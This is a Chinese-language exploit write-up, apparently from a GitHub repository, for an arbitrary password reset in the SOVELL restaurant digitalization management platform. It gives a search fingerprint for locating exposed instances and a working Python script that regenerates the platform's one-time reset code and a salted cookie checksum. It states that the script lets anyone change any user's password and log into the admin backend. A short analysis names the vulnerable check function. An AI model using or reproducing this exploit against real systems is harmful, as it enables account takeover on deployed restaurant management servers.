雄伟-餐厅数字化任意密码重置

指纹：

`app="SOVELL-餐厅数字化管理平台"`

在重置密码处的动态码

suanfa.py

```
import math
import datetime


def find_valid_minute():
    min_val = datetime.datetime.now().minute
    while math.pow(2.0, min_val - 1) % min_val != 1.0:
        min_val += 1
    return min_val


def calculate_password(min_val):
    t = 0
    a = 10
    c = 14 * (min_val + 6)
    e = 0
    f = [a // 5] * (c + 1)

    for k in range(c, 0, -14):
        d = 0
        l = k
        m = k * 2

        while True:
            d += f[l] * a
            m -= 1
            f[l] = d % m
            d //= m
            m -= 1
            l -= 1
            if l == 0:
                break
            d *= l

        min_val -= 1
        if min_val < 0:
            t = t * 10 + e + d // a
        e = d % a

    return t


min_val = find_valid_minute()
password = calculate_password(min_val)
print("Generated Password:", password)


def generate_cookie_checksum(cookie_value):
    import hashlib
    combined_value = cookie_value + "wsx%1234"
    md5_hash = hashlib.md5(combined_value.encode()).hexdigest()
    return md5_hash[:6].lower()


cookie_value = "example_cookie_value"  # Replace with the actual cookie value
cookie_checksum = generate_cookie_checksum(cookie_value)
print("Generated Cookie Checksum:", cookie_checksum)
```

![image](https://github.com/user-attachments/assets/f2ffd2be-6cd6-4d0c-b91f-2adf9520575d)

这部说明otp绕过成功，之后就可以随便修改密码了
![image](https://github.com/user-attachments/assets/145b7453-6f50-41a1-95dd-c28b880df214)


可能有的界面不一样，但是otp生成方法一样，都可以成功
成功截图
![image](https://github.com/user-attachments/assets/2af9911a-d992-4c36-9e08-a015fb7bd73b)



漏洞分析
![image](https://github.com/user-attachments/assets/ae18291f-1c68-4f9f-a1a6-4dbbfd114fee)

可以看到Check_ET_CheckPwdz201函数进行了检测
跟入该函数
![image](https://github.com/user-attachments/assets/7926ee4c-38a0-497e-9ad2-01e6106f6b29)
可以看到有算法，那么将其写成python脚本即可生成otp进行任意用户密码修改，从而登录后台
